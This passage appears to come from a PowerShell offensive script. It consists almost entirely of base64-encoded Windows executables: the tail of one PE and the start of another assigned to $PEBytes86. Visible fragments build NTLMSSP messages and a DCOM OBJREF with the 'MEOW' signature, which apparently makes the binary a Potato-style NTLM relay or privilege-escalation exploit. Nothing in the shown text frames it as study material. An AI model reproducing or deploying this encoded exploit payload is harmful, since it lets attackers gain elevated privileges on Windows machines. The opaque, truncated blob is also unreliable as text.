ASWAgDQYQEA0mIBACiWAgDUYgEA7WMBACiWAgDwYwEAYGUBAEiWAgBgZQEAS2YBALyVAgBMZgEAL2kBAOyVAgAwaQEAe2kBALSHAgB8aQEAtWkBANCFAgC4aQEALmsBAGyWAgAwawEA42sBAGiFAgDsawEAR20BAICQAgBQbQEAfG8BAKSWAgB8bwEAMHEBALyWAgAwcQEAeXEBANCWAgB8cQEAwIMBAISWAgDAgwEAR4QBANSHAgBIhAEAXIQBAGiFAgBchAEAQIUBAOCWAgBAhQEAKIYBAPCWAgAohgEAoYYBALyFAgCkhgEAW4cBAMSFAgBchwEAGIgBAMSFAgAYiAEAd4gBAGiFAgB4iAEAG4kBALyFAgAwiQEAi4kBAACXAgCLiQEAr4wBABiXAgCvjAEAzYwBADyXAgDQjAEA5Y8BAFyXAgDojwEAfpABAEyXAgCAkAEAl5ABAGiFAgCYkAEA55ABAGiFAgDokAEA2JEBABSRAgAkkgEAXZIBAGiFAgBgkgEA2pIBAMSFAgDckgEATZMBAISXAgBQkwEA8ZMBAJCVAgD0kwEAsZQBAMSFAgDQlAEAv5UBAKiXAgDAlQEAWZYBANSHAgBslgEAp5YBANiXAgColgEAfZgBAOCXAgCAmAEA45gBALyFAgDkmAEABJkBALyFAgAEmQEAUJkBALyFAgBQmQEAoJkBALyFAgBwmgEAG6ABAACYAgBwoQEAt6IBAAyYAgA8owEAp6MBAMSFAgDAowEAfaQBAMCKAgCApAEA0qQBALSHAgDUpAEA8KQBAGiFAgDwpAEArqUBAByYAgCwpQEAHqYBALyFAgAopgEA5qgBADCYAgDoqAEATakBAFyYAgBQqQEACqoBANSHAgAMqgEAM6sBAGSYAgBQqwEAwKsBAISYAgDAqwEA4KsBAJiFAgDgqwEAdqwBAIyYAgCQrAEAoKwBAJiYAgDgrAEAB60BAKCFAgAIrQEAFbABAKCYAgAYsAEARrABAGiFAgBIsAEAZbABALyFAgBosAEA5LABALSYAgDksAEAA7EBALyFAgAEsQEAFbEBAGiFAgAYsQEANbEBAGiFAgA4sQEAk7EBANyYAgDwsQEAPbIBAOSYAgBwsgEA9bIBAPCKAgD4sgEAd7MBAPCKAgCQswEA4bMBAAiZAgAAtAEAx7QBABCZAgBwtgEA77YBAPCKAgAAtwEAArcBAKiHAgAgtwEAJrcBALCHAgA8twEAWrcBAEiHAgBatwEAcrcBAHCHAgBytwEAA7gBAJCIAgADuAEAorgBAJCIAgCiuAEAOLkBANyIAgA4uQEAXbkBAEiHAgBduQEA1bkBANyIAgDVuQEABLoBAEiHAgAEugEAh7oBANyIAgCHugEAnboBAEiHAgCdugEAwLoBAEiHAgDAugEA1roBAECKAgDWugEA+boBAECKAgD5ugEAE7sBAEiHAgATuwEALrsBAEiHAgAuuwEASbsBAEiHAgBVuwEAa7sBAEiHAgBruwEAhbsBAEiHAgCFuwEAnrsBAEiHAgCeuwEAu7sBAEiHAgC7uwEA1LsBAEiHAgDUuwEA7bsBAEiHAgDtuwEABrwBAEiHAgAGvAEAJ7wBAEiHAgAnvAEAP7wBAEiHAgA/vAEAWbwBAEiHAgBZvAEAcLwBAEiHAgBwvAEAnLwBAEiHAgCgvAEAwLwBAEiHAgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAK5XAACrVwAA11cAAKdXAAC0VwAAxFcAANRXAACkVwAA3FcAALhXAADwVwAA4FcAALBXAADAVwAA0FcAAKBXAAD4VwAAAAAAAAAAAAAAAAAA/o4AAOSPAAA4jwAAb48AAOqPAADPjwAAwI8AAECPAADdjwAApY8AAJaPAAAgjwAAs48AAICPAABYjwAAAI8AAMaRAAC/kQAAsZEAAKORAACVkQAAgZEAAG2RAABZkQAARZEAAPaSAADvkgAA4ZIAANOSAADFkgAAsZIAAJ2SAACJkgAAdZIAAFKUAABLlAAAPZQAAC+UAAAhlAAAE5QAAAWUAAD3kwAA6ZMAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABABgAAAAYAACAAAAAAAAAAAAAAAAAAAABAAEAAAAwAACAAAAAAAAAAAAAAAAAAAABAAkEAABIAAAAYAADAH0BAAAAAAAAAAAAAAAAAAAAAAAAPD94bWwgdmVyc2lvbj0nMS4wJyBlbmNvZGluZz0nVVRGLTgnIHN0YW5kYWxvbmU9J3llcyc/Pg0KPGFzc2VtYmx5IHhtbG5zPSd1cm46c2NoZW1hcy1taWNyb3NvZnQtY29tOmFzbS52MScgbWFuaWZlc3RWZXJzaW9uPScxLjAnPg0KICA8dHJ1c3RJbmZvIHhtbG5zPSJ1cm46c2NoZW1hcy1taWNyb3NvZnQtY29tOmFzbS52MyI+DQogICAgPHNlY3VyaXR5Pg0KICAgICAgPHJlcXVlc3RlZFByaXZpbGVnZXM+DQogICAgICAgIDxyZXF1ZXN0ZWRFeGVjdXRpb25MZXZlbCBsZXZlbD0nYXNJbnZva2VyJyB1aUFjY2Vzcz0nZmFsc2UnIC8+DQogICAgICA8L3JlcXVlc3RlZFByaXZpbGVnZXM+DQogICAgPC9zZWN1cml0eT4NCiAgPC90cnVzdEluZm8+DQo8L2Fzc2VtYmx5Pg0KAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAwAEA3AAAAIijkKOYo6CjqKO4o9Cj2KPgo+ij8KP4oxCkGKQgpJCkmKSgpKiksKS4pMCkyKTQpNik8KT4pAClqKi4qMio2KjoqPioCKkYqSipOKlIqVipaKl4qYipmKmoqbipyKnYqeip+KkIqhiqKKo4qkiqWKpoqniqiKqYqqiquKrIqtiq6Kr4qgirGKsoqzirSKtYq2ireKuIq5irqKu4q8ir2Kvoq/irCKwYrCisOKxIrFisaKx4rIismKyorLisyKzYrOis+KwIrRitKK04rUitWK1orXitANABAPwAAABApEikUKRYpGCkaKTIpdCl2KXgpQCmEKYgpjCmQKZQpmCmcKaAppCmoKawpsCm0KbgpvCmAKcQpyCnMKdAp1CnYKdwp4CnkKegp7CnwKfQp+Cn8KcAqBCoIKgwqECoUKhgqHCogKiQqKCosKjAqNCo4KjwqACpEKkgqTCpQKlQqWCpcKmAqZCpoKmwqcCp0KngqfCpAKoQqiCqMKpAqlCqYKpwqoCqkKqgqrCqwKrQquCq8KoAqxCrIKswq0CrUKtgq3CrgKuQq6CrsKvAq9Cr4KvwqwCsEKwgrDCsQKxQrGCscKyArJCsoKywrMCs0KzgrPCsAOABAEAAAAC4o8CjyKNArlCuYK5ornCueK6AroiukK6YrqiusK64rsCuyK7Qrtiu4K74rgivGK8gryivMK84rwDwAQAAAQAAsKC4oMCgyKDQoNig4KDooPCg+KAAoQihEKEYoSChKKEwoTihQKFIoWCmaKZwpnimgKaIppCmmKagpqimsKa4psCmyKbQptimQKdIp1CnWKdgp2incKd4p4CniKeQp5inoKeop7CnuKfAp8in0KfYp+Cn6Kfwp/inAKgIqBCoGKggqCioMKg4qECoSKhQqFioYKhoqHCoeKiAqIiokKigqKiosKi4qMCoyKjQqNio4KjoqPCo+KgAqQipEKkYqSCpKKkwqTipQKlIqVCpWKlgqWipcKl4qYCpiKmQqZipoKmoqbCpuKnAqcip0KnYqeCp6KnwqfipAAAAAAIATAEAAMil0KXYpeClOKZIplimaKZ4poimmKaoprimyKbYpuim+KYIpxinKKc4p0inWKdop3iniKeYp6inuKfIp9in6Kf4pwioGKgoqDioSKhYqGioeKiIqJioqKi4qMio2KjoqPioCKkYqSipOKlIqVipaKl4qYipmKmoqbipyKnYqeip+KkIqhiqKKo4qkiqWKpoqniqiKqYqqiquKrIqtiq6Kr4qgirGKsoqzirSKtYq2ireKuIq5irqKu4q8ir2Kvoq/irCKwYrCisOKxIrFisaKx4rIismKyorLisyKzYrOis+KwIrRitKK04rUitWK1orXitiK2YraituK3Irdit6K34rQiuGK4orjiuSK5YrmiueK6IrpiuqK64rsiu2K7orviuCK8YryivOK9Ir1ivaK94r4ivmK+or7ivyK/Yr+iv+K8AAAAQAgCYAAAACKAYoCigOKBIoFigaKB4oIigmKCooLigyKDYoOig+KAIoRihKKE4oUihWKFooXihiKGYoaihuKHIodih6KH4oQiiGKIoojiiSKJYomiieKKIopiiqKK4osii2KLooviiCKMYoyijOKNIo1ijaKN4o4ijmKOoo7ijyKPYo+ij+KMIpBikKKQ4pEikWKRopAAAACACANABAACQoKCgsKDAoNCg4KDwoAChEKEgoTChQKFQoWChcKGAoZChoKGwocCh0KHgofChAKIQoiCiMKJAolCiYKJwooCikKKgorCiwKLQouCi8KIAoxCjIKMwo0CjUKNgo3CjgKOQo6CjsKPAo9Cj4KPwowCkEKQgpDCkQKRQpGCkcKSApJCkoKSwpMCk0KTgpPCkAKUQpSClMKVApVClYKVwpYClkKWgpbClwKXQpeCl8KUAphCmIKYwpkCmUKZgpnCmgKaQpqCmsKbAptCm4KbwpgCnEKcgpzCnQKdQp2CncKeAp5CnoKewp8Cn0Kfgp/CnAKgQqCCoMKhAqFCoYKhwqICokKigqLCowKjQqOCo8KgAqRCpIKkwqUCpUKlgqXCpgKmQqaCpsKnAqdCp4KnwqQCqEKogqjCqQKpQqmCqcKqAqpCqoKqwqsCq0KrgqvCqAKsQqyCrMKtAq1CrYKtwq4CrkKugq7CrwKvQq+Cr8KsArBCsIKwwrECsUKxgrHCsgKyQrKCssKzArNCs4KzwrACtEK0grTCtQK1QrWCtcK2ArZCtoK2wrcCt0K3grfCtAK4QriCuMK5ArlCuYK5wroCukK6grrCuwK4AYAIAbAAAABClGKUgpSilMKU4pUClSKVQpVilYKVopXCleKWApYilkKWYpaClqKWwpbilwKXIpdCl2KXgpeil8KUYrCCsKKwwrDisQKxIrGCsaKxwrHisgKyIrJCscK+Ar7CvwK/Qr+CvAAAAcAIAvAAAABCgIKAwoECgUKBgoHCggKCwoMCg0KDgoPCgAKEQoSChMKE4oUChcKG4odCh4KHwoZiiqKK4osii0KLYouCi6KLwoviiAKMIoxCjGKMgoyijUKNoo3CjeKOAo4ijkKOYo9ij4KPoo/CjKKQ4pGCkaKRwpHikiKSYpLikyKTwpAClGKUopTClOKVApUilUKXwpgCnEKcgpzCnQKdQp6CnwKfYp/CnEKi4qNCo2Kh4qYCpiKmQqQCwAgBoAAAAsKH4oRiiOKJYoniiqKLAosii0KIIoxCjIKNwqHiogKiIqJComKigqKiosKi4qMio0KjYqOCo6KjwqPioAKlAqlCqaKqQqriq4KoIqzCrYKuAq6CrwKvoqwisOKxwrAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'

$PEBytes86 = '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